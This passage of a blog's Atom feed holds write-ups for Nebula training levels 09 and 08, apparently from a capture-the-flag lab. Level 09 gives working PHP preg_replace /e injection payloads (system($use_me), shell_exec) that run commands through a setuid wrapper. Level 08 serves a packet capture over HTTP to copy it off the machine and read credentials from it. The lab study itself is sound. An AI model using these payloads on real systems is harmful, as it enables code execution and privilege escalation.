+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;output &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; markup&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1], &lt;span class=&quot;nv&quot;&gt;$argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;print $&lt;/span&gt;output&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hmmmm,&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Notice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;Undefined&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Notice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;Undefined&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Filename&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cannot&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have 2 notices and one warning. According to the “C setuid wrapper for some vulnerable PHP code” and to the file_get_contents() PHP function, we must provide a file to our ELF which is C setuid wrapper to our PHP code.&lt;/p&gt;
+
+&lt;p&gt;Ok fine but how do we get to the “getflag” command executed as the level09 user???&lt;/p&gt;
+
+&lt;p&gt;Well, on the line &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;$contents = preg_replace(&quot;/(email(.∗)email(.∗))/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);&quot;&lt;/code&gt; you will observe that there is preg_replace with /e modifier which will lead to Arbitrary Code Execution.&lt;/p&gt;
+
+&lt;p&gt;Wonder how the hell I know that? Well here is the most resourceful link on the internet for exploitable PHP functions: https://stackoverflow.com/questions/3115559/exploitable-php-functions Enjoy.&lt;/p&gt;
+
+&lt;p&gt;Now let’s inject something. On the line &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;$output = markup($argv[1], $argv[2]);&quot;&lt;/code&gt; we can observe that we call the function markup with 2 different arguments.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;markup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$use_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/(\[email (.*)\])/e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;spam(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/\[/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/\]/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now by taking a look at the above function called markup, we can observe that the first argument will be out attack vector. Furthermore, $use_me is useless but it must be used!&lt;/p&gt;
+
+&lt;p&gt;Let’s begin.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[email test@test.test]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/test
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/test
+&lt;span class=&quot;go&quot;&gt;[email test@test.test]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;First excution!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test sexy_pussycat
+&lt;span class=&quot;go&quot;&gt;test AT test dot test
+⇒ Expected result…​ NOT GOOD!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[email phpinfo()]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/test
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/test
+&lt;span class=&quot;go&quot;&gt;[email phpinfo()]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Second execution!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test sexy_pussycat
+&lt;span class=&quot;go&quot;&gt;phpinfo()
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ Hmm, we are getting there!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; nano /tmp/test
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/test
+&lt;span class=&quot;gp&quot;&gt;[email {$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;phpinfo&lt;span class=&quot;o&quot;&gt;()}}]&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Third execution!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test sexy_pussycat
+&lt;span class=&quot;go&quot;&gt;phpinfo()
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;PHP Version =&amp;gt;&lt;/span&gt; 5.3.6-13ubuntu3.2
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;System =&amp;gt;&lt;/span&gt; Linux nebula 3.0.0-12-generic &lt;span class=&quot;c&quot;&gt;#20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;Build Date =&amp;gt;&lt;/span&gt; Oct 13 2011 23:17:32
+&lt;span class=&quot;gp&quot;&gt;Server API =&amp;gt;&lt;/span&gt; Command Line Interface
+&lt;span class=&quot;gp&quot;&gt;Virtual Directory Support =&amp;gt;&lt;/span&gt; disabled
+&lt;span class=&quot;gp&quot;&gt;Configuration File (php.ini) Path =&amp;gt;&lt;/span&gt; /etc/php5/cli
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;sniiiiiiiiiiiiiiiiiiiiiiiiip of large output&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ Gentlemen’s we have achieved an Arbitrary Code Execution of an PHP function.&lt;/p&gt;
+
+&lt;p&gt;WOW, WOW, wait a second! We have executed only a PHP function using an C setuid wrapper for some vulnerable PHP code. But instead of executing a PHP function we need to execute a linux system command (getflag) as the user level09. Fun time. Check setuid permission.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 13
+drwxr-x--- 2 flag09 level09   98 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag09 flag09   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag09 flag09  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag09 flag09   675 May 18  2011 .profile
+-rwsr-x--- 1 flag09 level09 7240 Nov 20  2011 flag09
+-rw-r--r-- 1 root   root     491 Nov 20  2011 flag09.php
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Perfect, using setuid on flag09 ELF we can leverage our commands to be executed as level09. But how do we linux system command? Weeeeellll, by using another PHP function (daaaah lol).
+Fourth execution!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; nano /tmp/test
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/test
+&lt;span class=&quot;gp&quot;&gt;[email {$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ls -lart&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}]&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test sexy_pussycat
+&lt;span class=&quot;go&quot;&gt;PHP Parse error:  syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;spam(&quot;{$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lart&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;) in /home/flag09/flag09.php on line 15
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ FAIL! We can not escape the “&quot; in order to execute a proper command.
+⇒ Small trick for you guys.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; nano /tmp/test
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/test
+&lt;span class=&quot;gp&quot;&gt;[email {$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$use_me&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)}}]&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test sexy_pussycat
+&lt;span class=&quot;go&quot;&gt;sh: sexy_pussycat: command not found
+PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Apparently we do not have a system command called “sexy_pussycat”, sad day…​ But for the grand final:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09 /tmp/test getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well done! At this point you have finished 50% of Nebula from Exploit Exercises. Share, subscribe and ask question!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 08</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-08/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 08" />
+      
+      <published>2018-07-16T15:49:00-03:00</published>
+      <updated>2018-07-16T15:49:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-08</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-08/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
+To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;There is no source code available for this level&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;As usual let’s go to our flag account folder. I bet you will get bored of that at some point.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag08/
+&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 14
+drwxr-x--- 2 flag08 level08   86 Aug 19  2012 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag08 flag08   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag08 flag08  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag08 flag08   675 May 18  2011 .profile
+-rw-r--r-- 1 root   root    8302 Nov 20  2011 capture.pcap
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hmm, for the first time it seems to be a pcap file!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt; file capture.pcap
+&lt;span class=&quot;go&quot;&gt;capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Definitely! But what is wireshark or tcpdump?&lt;/p&gt;
+
+&lt;p&gt;Wireshark is a network packet analyzer. A network packet analyzer will try to capture network packets and tries to display that packet data as detailed as possible.&lt;/p&gt;
+
+&lt;p&gt;You could think of a network packet analyzer as a measuring device used to examine what’s going on inside a network cable, just like a voltmeter is used by an electrician to examine what’s going on inside an electric cable (but at a higher level, of course).&lt;/p&gt;
+
+&lt;p&gt;In the past, such tools were either very expensive, proprietary, or both. However, with the advent of Wireshark, all that has changed.&lt;/p&gt;
+
+&lt;p&gt;Wireshark is perhaps one of the best open source packet analyzers available today.&lt;/p&gt;
+
+&lt;p&gt;And in other simpler words, tcpdump is the CLI (Command Line Interface) tool as Wireshark.&lt;/p&gt;
+
+&lt;p&gt;As you can see we have to open the “capture.pcap” file in a one of the above described tools and to get some information about our task. Personally I enjoy and know Wireshark, but here I can not install anything. Let’s make a simple HTTP server using python to retrive our file from the server.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt;  python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer
+&lt;span class=&quot;go&quot;&gt;Serving HTTP on 0.0.0.0 port 8000 ...
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2022-31-01.png&quot; alt=&quot;Python Service&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2022-31-19.png&quot; alt=&quot;Pcap&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt;  python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer
+&lt;span class=&quot;go&quot;&gt;Serving HTTP on 0.0.0.0 port 8000 ...
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] &quot;GET / HTTP/1.1&quot; 200 -
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] code 404, message File not found
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] &quot;GET /robots.txt HTTP/1.1&quot; 404 -
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] code 404, message File not found
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -
+192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:58:25] &quot;GET /capture.pcap HTTP/1.1&quot; 200 -
+^CTraceback (most recent call last):
+  File &quot;/usr/lib/python2.7/runpy.py&quot;, line 162, in _run_module_as_main
+    &quot;__main__&quot;, fname, loader, pkg_name)
+  File &quot;/usr/lib/python2.7/runpy.py&quot;, line 72, in _run_code
+    exec code in run_globals
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;/usr/lib/python2.7/SimpleHTTPServer.py&quot;, line 220, in &amp;lt;module&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;    test()
+  File &quot;/usr/lib/python2.7/SimpleHTTPServer.py&quot;, line 216, in test
+    BaseHTTPServer.test(HandlerClass, ServerClass)
+  File &quot;/usr/lib/python2.7/BaseHTTPServer.py&quot;, line 602, in test
+    httpd.serve_forever()
+  File &quot;/usr/lib/python2.7/SocketServer.py&quot;, line 225, in serve_forever
+    r, w, e = select.select([self], [], [], poll_interval)
+KeyboardInterrupt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level08@nebula:/home/flag08$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point I closed my HTTP server. Let’s see the file I have just downloaded.&lt;/p&gt;
+
+&lt;p&gt;Right click on first packet &amp;gt; Follow &amp;gt; TCP Stream&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2022-31-45.png&quot; alt=&quot;Pcap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point you could try your luck with the given password, but you can be also smarter and interpret everything in hexa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2022-32-05.png&quot; alt=&quot;Pcap&quot; /&gt;&lt;/p&gt;
+
